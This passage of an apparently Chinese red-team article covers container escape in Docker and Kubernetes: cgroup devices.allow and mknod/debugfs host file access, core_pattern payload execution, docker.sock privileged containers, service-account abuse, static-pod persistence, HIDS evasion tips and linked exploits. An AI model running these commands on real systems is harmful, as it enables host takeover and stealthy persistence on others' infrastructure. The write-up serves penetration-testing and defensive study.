的场景，并调研文档和资料构建了一套相应的容器逃逸思路；由此可见，这个场景和手法在实际的攻防演练中也是非常有价值的。</p><p>lxcfs： <a href="https://linuxcontainers.org/lxcfs/">https://linuxcontainers.org/lxcfs/</a></p><p>假设业务使用 lxcfs 加强业务容器在 &#x2F;proc&#x2F; 目录下的虚拟化，以此为前提，我们构建出这样的 demo pod:</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft1G5hEGn2nOicDpFookOYNsyicbG6RARkn8o9licXQRlhpNooetfuzqBNA/640?wx_fmt=png" alt="图片"></p><p>并使用 <code>lxcfs /data/test/lxcfs/</code> 修改了 data 目录下的权限。若蓝军通过渗透控制的是该容器实例，则就可以通过下述的手法达到逃逸访问宿主机文件的目的，这里简要描述一下关键的流程和原理。</p><p>（1）首先在容器内，蓝军需要判断业务是否使用了 lxcfs，在 mount 信息里面可以进行简单判断，当然容器不一定包含 mount 命令，也可以使用 cat &#x2F;proc&#x2F;1&#x2F;mountinfo 获取</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftqyVYKOTgP0AoQNODZ1K4HIZCmIVEY26jluyICLqtt7KqaJzx2SnpCg/640?wx_fmt=png" alt="图片"></p><p>（2）此时容器内会出现一个新的虚拟路径：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftv1x875RksBQzoI6fufzz26pmIYOvumjBUg1Lq6NXCCjfgqHn8K4AIw/640?wx_fmt=png" alt="图片"></p><p>（3）更有趣的是，该路径下会绑定当前容器的 devices subsystem cgroup 进入容器内，且在容器内有权限对该 devices subsystem 进行修改。</p><p>使用 echo a &gt; devices.allow 可以修改当前容器的设备访问权限，致使我们在容器内可以访问所有类型的设备。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftlHhr7YzFOqx19KDYSy28icQTXFmWKdeZkjYSCpao7CU3LX63kvSds5g/640?wx_fmt=png" alt="图片"></p><p>（4）如果跟进过 CVE-2020-8557 这个具有 Kubernetes 特色的拒绝服务漏洞的话，应该知道</p><p>&#x2F;etc&#x2F;hosts， &#x2F;dev&#x2F;termination-log，&#x2F;etc&#x2F;resolv.conf， &#x2F;etc&#x2F;hostname 这四个容器内文件是由默认从宿主机挂载进容器的，所以在他们的挂载信息内很容易能获取到主设备号 ID。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftaDwpX3m03LqY7DkaWfzPOFB57iatun8yhuOJODZtXDO1SoR07LYTRKg/640?wx_fmt=png" alt="图片"></p><p>（5）我们可以使用 mknod 创建相应的设备文件目录并使用 debugfs 进行访问，此时我们就有了读写宿主机任意文件的权限。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftwacESL1sXDo8ZDKpia4qGyyibXtqtQbcSIh95DCRgjpuXYIoJTIly3Gw/640?wx_fmt=png" alt="图片"></p><p>这个手法和利用方式不仅可以作用于 lxcfs 的问题，即使没有安装和使用 lxcfs，当容器为 privileged、sys_admin 等特殊配置时，可以使用相同的手法进行逃逸。我们曾经多次使用类似的手法逃逸 privileged、sys_admin 的场景 (在容器内 CAPABILITIES sys_admin 其实是 privileged 的子集)，相较之下会更加隐蔽。</p><p>当然自动化的工具可以帮我们更好的利用这个漏洞并且考虑容器内的更多情况，这里自动化 EXP 可以使用 CDK 工具 (该工具由笔者 neargle 和 CDXY 师傅一同研发和维护，并正在持续迭代中)：</p><p><a href="https://github.com/cdk-team/CDK/wiki/Exploit:-lxcfs-rw">https://github.com/cdk-team/CDK/wiki/Exploit:-lxcfs-rw</a></p><p>逃逸章节所使用的技巧很多都在 CDK 里有自动化的集成和实现。</p><h3 id="5-3-创建-cgroup-进行容器逃逸"><a href="#5-3-创建-cgroup-进行容器逃逸" class="headerlink" title="5.3. 创建 cgroup 进行容器逃逸"></a>5.3. 创建 cgroup 进行容器逃逸</h3><p>上面提到了 privileged 配置可以理解为一个很大的权限集合，可以直接 mount device 并不是它唯一的权限和利用手法，另外一个比较出名的手法就是利用 cgroup release_agent 进行容器逃逸以在宿主机执行命令，这个手法同样可以作用于 sys_admin 的容器。</p><p>shell 利用脚本如下（bash 脚本参考： <a href="https://github.com/neargle/cloud_native_security_test_case/blob/master/privileged/1-host-ps.sh">https://github.com/neargle/cloud_native_security_test_case&#x2F;blob&#x2F;master&#x2F;privileged&#x2F;1-host-ps.sh</a>）：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftEWoZ2qyfQR8GX93YnMXf5adbPsONoOGjWgdznasxJdciaib9PNHZVrDQ/640?wx_fmt=png" alt="图片"></p><p>输出示例：  </p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftd0OAOT3fzaDQCAlAaIRQSgEWIol1sKbUxz1Ttg9BxcCMcpLcw46jcA/640?wx_fmt=png" alt="图片"></p><p>其中</p><p>host_path&#x3D;<code>sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab</code> </p><p>的做法经常在不同的 Docker 容器逃逸 EXP 被使用到；如果我们在漏洞利用过程中，需要在容器和宿主机内进行文件或文本共享，这种方式是非常棒且非常通用的一个做法。</p><p>其思路在于利用 Docker 容器镜像分层的文件存储结构 (Union FS)，从 mount 信息中找出宿主机内对应当前容器内部文件结构的路径；则对该路径下的文件操作等同于对容器根目录的文件操作。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftiauaaBrb6vQiarVSQpAfSdVPiaqxX6ibhHGvFWruakuTM85UIYQ40J6TZQ/640?wx_fmt=png" alt="图片"></p><p>此类手法如果 HIDS 并未针对容器逃逸的特性做一定优化的话，则 HIDS 对于逃逸在母机中执行命令的感知能力可能就会相对弱一点。不过业界的 EDR 和 HIDS 针对此手法进行规则覆盖的跟进速度也很快，已有多款 HIDS 对此有一定的感知能力。</p><p>另外一个比较小众方法是借助上面 lxcfs 的思路，复用到 sys_admin 或特权容器的场景上读写母机上的文件。（腾讯蓝军的兄弟们问得最多的手法之一，每过一段时间就有人过来问一次 ~）</p><ol><li>首先我们还是需要先创建一个 cgroup 但是这次是 device subsystem 的。</li></ol><p>mkdir &#x2F;tmp&#x2F;dev</p><p>mount -t cgroup -o devices devices &#x2F;tmp&#x2F;dev&#x2F;</p><ol start="2"><li>修改当前已控容器 cgroup 的 devices.allow，此时容器内已经可以访问所有类型的设备,</li></ol><p>命令： echo a &gt;</p><p>&#x2F;tmp&#x2F;dev&#x2F;docker&#x2F;b76c0b53a9b8fb8478f680503164b37eb27c2805043fecabb450c48eaad10b57&#x2F;devices.allow</p><ol start="3"><li>同样的，我们可以使用 mknod 创建相应的设备文件目录并使用 debugfs 进行访问，此时我们就有了读写宿主机任意文件的权限。</li></ol><p>mknod near b 252 1</p><p>debugfs -w near</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft26N0dJav4icNaXnENfhzLNH3K7R4ODLpCDsEmWyiawlw3HjBaib8Mx8OQ/640?wx_fmt=png" alt="图片"></p><h3 id="5-4-特殊路径挂载导致的容器逃逸"><a href="#5-4-特殊路径挂载导致的容器逃逸" class="headerlink" title="5.4. 特殊路径挂载导致的容器逃逸"></a>5.4. 特殊路径挂载导致的容器逃逸</h3><p>这类的挂载很好理解，当例如宿主机的内的 &#x2F;, &#x2F;etc&#x2F;, &#x2F;root&#x2F;.ssh 等目录的写权限被挂载进容器时，在容器内部可以修改宿主机内的 &#x2F;etc&#x2F;crontab、&#x2F;root&#x2F;.ssh&#x2F;、&#x2F;root&#x2F;.bashrc 等文件执行任意命令，就可以导致容器逃逸。</p><p>执行下列命令可以很容易拥有这样的环境：</p><p>➜  ~ docker run -it -v &#x2F;:&#x2F;tmp&#x2F;rootfs ubuntu bash</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftatOPnCicAiaV8lXHkvKuPQFT4aUSJicKE5FhfKibxWx3PQVAQAzJpMdxibw/640?wx_fmt=png" alt="图片"></p><h3 id="5-4-1-Docker-in-Docker"><a href="#5-4-1-Docker-in-Docker" class="headerlink" title="5.4.1 Docker in Docker"></a>5.4.1 Docker in Docker</h3><p>其中一个比较特殊且常见的场景是当宿主机的 &#x2F;var&#x2F;run&#x2F;docker.sock 被挂载容器内的时候，容器内就可以通过 docker.sock 在宿主机里创建任意配置的容器，此时可以理解为可以创建任意权限的进程；当然也可以控制任意正在运行的容器。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftw32wVunQaYQ1iczSQ50LvsNLQrqa0rG6mE3Ob2VSHh9gIj8gv5tgdVQ/640?wx_fmt=png" alt="图片"></p><p>这类的设计被称为： Docker in Docker。常见于需要对当前节点进行容器管理的编排逻辑容器里，历史上我遇到的场景举例：</p><p>a. 存在于 Serverless 的前置公共容器内</p><p>b. 存在于每个节点的日志容器内</p><p>如果你已经获取了此类容器的 full tty shell, 你可以用类似下述的命令创建一个通往母机的 shell。</p><p>.&#x2F;bin&#x2F;docker -H unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;rootfs&#x2F;var&#x2F;run&#x2F;docker.sock run -d -it –rm –name rshell -v “&#x2F;proc:&#x2F;host&#x2F;proc” -v “&#x2F;sys:&#x2F;host&#x2F;sys” -v “&#x2F;:&#x2F;rootfs” –network&#x3D;host –privileged&#x3D;true –cap-add&#x3D;ALL alpine:latest</p><p>如果想现在直接尝试此类逃逸利用的魅力，不妨可以试试 Google Cloud IDE 天然自带的容器逃逸场景，拥有 Google 账号可以直接点击下面的链接获取容器环境和利用代码，直接执行利用代码 try_google_cloud&#x2F;host_root.sh 再 chroot 到 &#x2F;rootfs 你就可以获取一个完整的宿主机 shell：  </p><p><a href="https://ssh.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/neargle/cloud_native_security_test_case.git">https://ssh.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/neargle/cloud_native_security_test_case.git</a></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftJ2vstIzkOJLNRZNzSwMyPUDLiagDBia53jYDqCTFD5Jpy07WbxBJpNhg/640?wx_fmt=png" alt="图片"></p><p>当然容器内部不一定有条件安装或运行 docker client，一般获取的容器 shell 其容器镜像是受限且不完整的，也不一定能安装新的程序，即使是用 pip 或 npm 安装第三方依赖包也很困难。</p><p>此时基于 golang 编写简易的利用程序，利用交叉编译编译成无需依赖的单独 bin 文件下载到容器内执行就是经常使用的方法了。</p><h3 id="5-4-2-攻击挂载了主机-x2F-proc-目录的容器"><a href="#5-4-2-攻击挂载了主机-x2F-proc-目录的容器" class="headerlink" title="5.4.2 攻击挂载了主机 &#x2F;proc 目录的容器"></a>5.4.2 攻击挂载了主机 &#x2F;proc 目录的容器</h3><p>另一个比较有趣的场景就是挂载了主机 &#x2F;proc 目录的容器，在历史的攻防演练中当我们遇到挂载了主机 &#x2F;proc 目录的容器，一般都会有其它可以逃逸的特性，如 sys_ptrace 或者 sys_admin 等，但是其实挂载了主机 &#x2F;proc 目录这个设置本身，就是一个可以逃逸在宿主机执行命令的特性。</p><p>我们可以简单的执行以下命令创建一个具有该配置的容器并获得其 shell：</p><p>docker run -v &#x2F;proc:&#x2F;host_proc –rm -it ubuntu bash</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftAB4cUYkuAw8qAOpVUiclIpDNYUxspI6KP34Zf91eVQ6xwiaNUqjm19hw/640?wx_fmt=png" alt="图片"></p><p>这里逃逸并在外部执行命令的方式主要是利用了 linux 的 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern 文件。</p><p>a. 首先我们需要利用在 release_agent 中提及的方法从 mount 信息中找出宿主机内对应当前容器内部文件结构的路径。</p><p><code>sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab</code></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftR3jLLNribmw1DuJ0NO9kjn0fYslX59rhRdZVYMNl1mKYIS8M5gUkbdw/640?wx_fmt=png" alt="图片"></p><p>b. 此时我们在容器内的 &#x2F;exp.sh 就对应了宿主机的 <code>/var/lib/docker/overlay2/a1a1e60a9967d6497f22f5df21b185708403e2af22eab44cfc2de05ff8ae115f/diff/exp.sh</code> 文件。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftH6nUncxl6ibtrUumbDmWNOdnibrBCJFwpf3HrTFZ9xFhhvkRa4BCgCjA/640?wx_fmt=png" alt="图片"></p><p>c. 因为宿主机内的 &#x2F;proc 文件被挂载到了容器内的 &#x2F;host_proc 目录，所以我们修改 &#x2F;host_proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern 文件以达到修改宿主机 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern 的目的。</p><p><code>echo -e &quot;|/var/lib/docker/overlay2/a1a1e60a9967d6497f22f5df21b185708403e2af22eab44cfc2de05ff8ae115f/diff/exp.sh \rcore&quot; &gt; /host_proc/sys/kernel/core_pattern</code></p><p>d. 此时我们还需要一个程序在容器里执行并触发 segmentation fault 使植入的 payload 即 exp.sh 在宿主机执行。</p><p>这里我们参考了 <a href="https://wohin.me/rong-qi-tao-yi-gong-fang-xi-lie-yi-tao-yi-ji-zhu-gai-lan/#4-2-procfs-">https://wohin.me/rong-qi-tao-yi-gong-fang-xi-lie-yi-tao-yi-ji-zhu-gai-lan/#4-2-procfs-</a> 里的 c 语言代码和 CDK-TEAM&#x2F;CDK 里面的 GO 语言代码：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftEOJquTPhAf5XtlOBCEjRNM4qALicMhjMymWib58D2HkicTv7N9OcmpwZw/640?wx_fmt=png" alt="图片"></p><p>e. 当然不能忘记给 exp.sh 赋予可执行权限。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftYW4ibU65yhwJFibysUswDMOdiaSJbEIQkaZNdSusFBShsaHSS81KjZC0g/640?wx_fmt=png" alt="图片"></p><p>当容器内的 segmentation fault 被触发时，我们就达到了逃逸到宿主机在容器外执行任意代码的目的。</p><h3 id="5-5-SYS-PTRACE-安全风险"><a href="#5-5-SYS-PTRACE-安全风险" class="headerlink" title="5.5. SYS_PTRACE 安全风险"></a>5.5. SYS_PTRACE 安全风险</h3><p>当 docker 容器设置 –cap-add&#x3D;SYS_PTRACE 或 Kubernetes PODS 设置 securityContext.capabilities 为 SYS_PTRACE 配置等把 SYS_PTRACE capabilities 权限赋予容器的情况，都可能导致容器逃逸。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftiatm1LG35dC04AKvK7vbmJibx5iciaena0ptqib9W2xOY9cVTVShyFmBMFQ/640?wx_fmt=png" alt="图片"></p><p>这个场景很常见，因为无论是不是线上环境，业务进行灾难重试和程序调试都是没办法避免的，所以容器经常被设置 ptrace 权限。</p><p>使用 capsh –print 可以判断当前容器是否附加了 ptrace capabilities。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftA5xR0WNgNA3DwdiaIoGn2mWmGGTzCwibmeRsejfKo8daibJ3fib6vxMWiaw/640?wx_fmt=png" alt="图片"></p><p>这里的利用方式和进程注入的方式大致无二，如果是使用 pupy 或 metasploit 维持容器的 shell 权限的话，利用框架现有的功能就能很方便的进行注入和利用。</p><p>当然，就如上面所述，拥有了该权限就可以在容器内执行 strace 和 ptrace 等工具，若只是一些常见场景的信息收集也不一定需要注入恶意 shellcode 进行逃逸才可以做到。</p><h3 id="5-6-利用大权限的-Service-Account"><a href="#5-6-利用大权限的-Service-Account" class="headerlink" title="5.6. 利用大权限的 Service Account"></a>5.6. 利用大权限的 Service Account</h3><p>使用 Kubernetes 做容器编排的话，在 POD 启动时，Kubernetes 会默认为容器挂载一个 Service Account 证书。同时，默认情况下 Kubernetes 会创建一个特有的 Service 用来指向 ApiServer。</p><p>有了这两个条件，我们就拥有了在容器内直接和 APIServer 通信和交互的方式。</p><p>Kubernetes Default Service</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftF3icYrbEyoajYW3lxKIYcevm66b3clvlQUIXxneO7LJLVqEibrEhHziaw/640?wx_fmt=png" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftTvug1uFW0iaib9xCxBAGmXIO0M5xgOpWb3SlNabapWZnkko7SQGf5gOw/640?wx_fmt=png" alt="图片"></p><p>Default Service Account</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft7TibDhibGHJ9Hrb2uIPSCEGiaUgacRkL4THkcThMyGmN2gPDUADeJLBzQ/640?wx_fmt=png" alt="图片"></p><p>默认情况下，这个 Service Account 的证书和 token 虽然可以用于和 Kubernetes Default Service 的 APIServer 通信，但是是没有权限进行利用的。</p><p>但是集群管理员可以为 Service Account 赋予权限：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftKYhULXklPpLiciaR5icMSuVehOY3FTUrkfIyCtvmj9IoiclZkZt5eW5gZA/640?wx_fmt=png" alt="图片"></p><p>此时直接在容器里执行 kubectl 就可以集群管理员权限管理容器集群。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftia4aojurXia3vykNrLmzUp1LxDKqalKT9wofHFks3F7f3v9OAjiaKMm4Q/640?wx_fmt=png" alt="图片"></p><p>因此获取一个拥有绑定了 ClusterRole&#x2F;cluster-admin Service Account 的 POD，其实就等于拥有了集群管理员的权限。</p><p>实际攻防演练利用过程中，有几个坑点：</p><ol><li><p>老版本的 kubectl 不会自动寻找和使用 Service Account 需要用 kubectl config set-cluster cfc 进行绑定或下载一个新版本的 kubectl 二进制程序；</p></li><li><p>如果当前用户的目录下配置了 kubeconfig 即使是错误的，也会使用 kubeconfig 的配置去访问不会默认使用 Service Account ；</p></li><li><p>历史上我们遇到很多集群会删除 Kubernetes Default Service，所以需要使用容器内的资产探测手法进行信息收集获取 apiserver 的地址。</p></li></ol><h3 id="5-7-CVE-2020-15257-利用"><a href="#5-7-CVE-2020-15257-利用" class="headerlink" title="5.7. CVE-2020-15257 利用"></a>5.7. CVE-2020-15257 利用</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftkxc6w0j4uicMY3jcHMyYhwBHL3cqqVoavpqlOQMQhLBtUEKmCZW6OUQ/640?wx_fmt=png" alt="图片"></p><p>此前 containerd 修复了一个逃逸漏洞，当容器和宿主机共享一个 net namespace 时（如使用 –net&#x3D;host 或者 Kubernetes 设置 pod container 的 .spec.hostNetwork 为 true）攻击者可对拥有特权的 containerd shim API 进行操作，可能导致容器逃逸获取主机权限、修改主机文件等危害。</p><p>官方建议升级 containerd 以修复和防御该攻击；当然业务在使用时，也建议如无特殊需求不要将任何 host 的 namespace 共享给容器，如 Kubernetes PODS 设置 hostPID: true、hostIPC: true、hostNetwork: true 等。</p><p>我们测试升级 containerd 可能导致运行容器退出或重启，有状态容器节点的升级要极为慎重。也因为如此，业务针对该问题进行 containerd 升级的概率并不高。</p><p>利用目前最方便的 EXP 为：</p><p><a href="https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn">https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn</a></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft66U7coycRmetNGibBpXjwjN6mjYogWazh856zC1Ajmeq34tC2jXdI0Q/640?wx_fmt=png" alt="图片"></p><h3 id="5-8-runc-CVE-2019-5736-和容器组件历史逃逸漏洞综述"><a href="#5-8-runc-CVE-2019-5736-和容器组件历史逃逸漏洞综述" class="headerlink" title="5.8. runc CVE-2019-5736 和容器组件历史逃逸漏洞综述"></a>5.8. runc CVE-2019-5736 和容器组件历史逃逸漏洞综述</h3><p>这个由 RUNC 实现而导致的逃逸漏洞太出名了，出名到每一次提及容器安全能力或容器安全研究都会被拿出来当做案例或 DEMO。但不得不说，这里的利用条件在实际的攻防场景里还是过于有限了；实际利用还是需要一些特定的场景才能真的想要去使用和利用它。</p><p>这里公开的 POC 很多，不同的环境和操作系统发行版本利用起来有一定的差异，可以参考进行利用：</p><ol><li><p>github.com&#x2F;feexd&#x2F;pocs</p></li><li><p>github.com&#x2F;twistlock&#x2F;RunC-CVE-2019-5736</p></li><li><p>github.com&#x2F;AbsoZed&#x2F;DockerPwn.py</p></li><li><p>github.com&#x2F;q3k&#x2F;cve-2019-5736-poc</p></li></ol><p>至于我们实际遇到的场景可以在 “容器相关组件的历史漏洞” 一章中查看。从攻防角度不得不说的是，这个漏洞的思路和 EXP 过于出名，几乎所有的 HIDS 都已经具备检测能力，甚至对某些 EXP 文件在静态文件规则上做了拉黑，所以大部分情况是使用该方法就等于在一定程度上暴露了行踪，需要谨慎使用。</p><h3 id="5-9-内核漏洞提权和逃逸概述"><a href="#5-9-内核漏洞提权和逃逸概述" class="headerlink" title="5.9. 内核漏洞提权和逃逸概述"></a>5.9. 内核漏洞提权和逃逸概述</h3><p>容器共享宿主机内核，因此我们可以使用宿主机的内核漏洞进行容器逃逸，比如通过内核漏洞进入宿主机内核并更改当前容器的 namespace，在历史内核漏洞导致的容器逃逸当中最广为人知的便是脏牛漏洞（CVE-2016-5195）了。</p><p>同时，近期还有一个比较出名的内核漏洞是 CVE-2020-14386，也是可以导致容器逃逸的安全问题。</p><p>这些漏洞的 POC 和 EXP 都已经公开，且不乏有利用行为，但同时大部分的 EDR 和 HIDS 也对 EXP 的利用具有检测能力，这也是利用内核漏洞进行容器逃逸的痛点之一。</p><h3 id="5-10-写-StaticPod-逃逸或权限维持"><a href="#5-10-写-StaticPod-逃逸或权限维持" class="headerlink" title="5.10. 写 StaticPod 逃逸或权限维持"></a>5.10. 写 StaticPod 逃逸或权限维持</h3><p>利用 Static Pod 是我们在容器逃逸和远程代码执行场景找到的解决方案，他是 Kubernetes 里的一种特殊的 Pod，由节点上 kubelet 进行管理。在漏洞利用上有以下几点明显的优势：</p><p>1、 仅依赖于 kubelet</p><p>Static Pod 仅依赖 kubelet，即使 K8s 的其他组件都奔溃掉线，删除 apiserver，也不影响 Static Pod 的使用。在 Kubernetes 已经是云原生技术事实标准的现在，kubelet 几乎运行与每个容器母机节点之上。</p><p>2、 配置目录固定</p><p>Static Pod 配置文件写入路径由 kubelet config 的 staticPodPath 配置项管理，默认为 &#x2F;etc&#x2F;kubernetes&#x2F;manifests 或 &#x2F;etc&#x2F;kubelet.d&#x2F;，一般情况不做更改。</p><p>3、 执行间隔比 Cron 更短</p><p>通过查看 Kubernetes 的源码，我们可以发现 kubelet 会每 20 秒监控新的 POD 配置文件并运行或更新对应的 POD；由 <code>c.FileCheckFrequency.Duration = 20 * time.Second</code> 控制，虽然 Cron 的每分钟执行已经算是非常及时，但 Static Pod 显然可以让等待 shell 的时间更短暂，对比 &#x2F;etc&#x2F;cron.daily&#x2F;* ， &#x2F;etc&#x2F;cron.hourly&#x2F;* ， &#x2F;etc&#x2F;cron.monthly&#x2F;* ， &#x2F;etc&#x2F;cron.weekly&#x2F;* 等目录就更不用说了。</p><p>另外，Cron 的分钟级任务也会遇到重复多次执行的问题，增加多余的动作更容易触发 IDS 和 IPS，而 Static Pod 若执行成功就不再调用，保持执行状态，仅在程序奔溃或关闭时可自动重启</p><p>4、 进程配置更灵活</p><p>Static Pod 支持 Kubernetes POD 的所有配置，等于可以运行任意配置的容器。不仅可以配置特权容器和 HostPID 使用 nscenter 直接获取容器母机权限；更可以配置不同 namespace、capabilities、cgroup、apparmor、seccomp 用于特殊的需求。</p><p>灵活的进程参数和 POD 配置使得 Static Pod 有更多方法对抗 IDS 和 IPS，因此也延生了很多新的对抗手法，这里就不再做过多介绍。</p><p>5、 检测新文件或文件变化的逻辑更通用</p><p>最重要的是，Static Pod 不依赖于 st_mtime 逻辑，也无需设置可执行权限，新文件检测逻辑更加通用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *sourceFile)</span></span> extractFromDir(name <span class="hljs-type">string</span>) ([]*v1.Pod, <span class="hljs-type">error</span>) &#123;<br>    dirents, err := filepath.Glob(filepath.Join(name, <span class="hljs-string">&quot;[^.]*&quot;</span>))<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;glob failed: %v&quot;</span>, err)<br>    &#125;<br>    pods := <span class="hljs-built_in">make</span>([]*v1.Pod, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(dirents))<br><br></code></pre></td></tr></table></figure><p>而文件更新检测是基于 kubelet 维护的 POD Hash 表进行的，配置的更新可以很及时和确切的对 POD 容器进行重建。Static Pod 甚至包含稳定完善的奔溃重启机制，由 kubelet 维护，属于 kubelet 的默认行为无需新加配置。操作系统层的痕迹清理只需删除 Static Pod YAML 文件即可，kubelet 会自动移除关闭运行的恶意容器。同时，对于不了解 Static Pod 的蓝队选手来说，我们需要注意的是，使用 <code>kubectl delete</code> 删除恶意容器或使用 <code>docker stop</code> 关闭容器都无法完全清除 Static Pod 的恶意进程，kubelet 会守护并重启该 Pod。</p><h2 id="6-容器相关组件的历史漏洞"><a href="#6-容器相关组件的历史漏洞" class="headerlink" title="6. 容器相关组件的历史漏洞"></a>6. 容器相关组件的历史漏洞</h2><p>2020 年我们和腾讯云的同学一起处理跟进分析了多个官方开源分支所披露的安全问题，并在公司内外的云原生能力上进行复现、分析，从产品和安全两个角度出发探讨攻击场景，保障云用户和业务的安全。  </p><p>其中投入时间比较多的，主要是以下十个漏洞，每个都非常有趣，且都在云产品上得到了妥善的跟进和安全能力建设：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftfyYibISQBmbTeyibKy0TwkdDMtGJIqoqlCDKkH4vaHxbb2MkzU3W6LRA/640?wx_fmt=png" alt="图片"></p><p>实际攻防场景里面我真实用过且在关键路径里起到作用的也就 CVE-2020-15257，其它漏洞的 POC 都只在漏洞公开时自建测试的环境复现和公司内服务的漏洞挖掘用了一下，有些环境虽然有漏洞，但是实际打真实目标却没怎么用得上。</p><p>值得一提的是最开始跟进分析时，因为 EXP 需要钓鱼让管理员去执行 docker exec 或 kubectl exec 才可以触发，所以不怎么看好的 CVE-2019-5736 RUNC 容器逃逸漏洞；反而是真的遇到几个无交互即可触发的场景。主要是 vscode server、jupyter notebook、container webconsole 等这种提供容器内交互式 shell 的多租户场景在企业内网里变多了，容器逃逸之后就是新的网络环境和主机环境。</p><h2 id="7-容器、容器编排组件-API-配置不当或未鉴权"><a href="#7-容器、容器编排组件-API-配置不当或未鉴权" class="headerlink" title="7. 容器、容器编排组件 API 配置不当或未鉴权"></a>7. 容器、容器编排组件 API 配置不当或未鉴权</h2><p>就安全问题来说，业界普遍接触最多、最首当其冲的就是容器组件服务的未鉴权问题。我们在 2019 年的时候整理了一份 Kubernetes 架构下常见的开放服务指纹，提供给到了地表最强的扫描器洞犀团队，就现在看来这份指纹也是比较全的。</p><ol><li><p>kube-apiserver: 6443, 8080</p></li><li><p>kubectl proxy: 8080, 8081</p></li><li><p>kubelet: 10250, 10255, 4149</p></li><li><p>dashboard: 30000</p></li><li><p>docker api: 2375</p></li><li><p>etcd: 2379, 2380</p></li><li><p>kube-controller-manager: 10252</p></li><li><p>kube-proxy: 10256, 31442</p></li><li><p>kube-scheduler: 10251</p></li><li><p>weave: 6781, 6782, 6783</p></li><li><p>kubeflow-dashboard: 8080</p></li></ol><p>前六个服务的非只读接口我们都曾经在渗透测试里遇到并利用过，都是一旦被控制可以直接获取相应容器、相应节点、集群权限的服务，也是广大公网蠕虫的必争之地。</p><h3 id="7-1-组件分工"><a href="#7-1-组件分工" class="headerlink" title="7.1. 组件分工"></a>7.1. 组件分工</h3><p>各个组件未鉴权所能造成的风险，其实从它们在 Kubernetes 集群环境里所能起到的作用就能很明显的判断出来，如 APIServer 是所有功能的主入口，则控制 APIServer 基本上等同控制集群的所有功能；而 kubelet 是单个节点用于进行容器编排的 Agent，所以控制 kubelet 主要是对单个节点下的容器资源进行控制。</p><p>组件分工上较为完整的图例可参考：</p><p><img 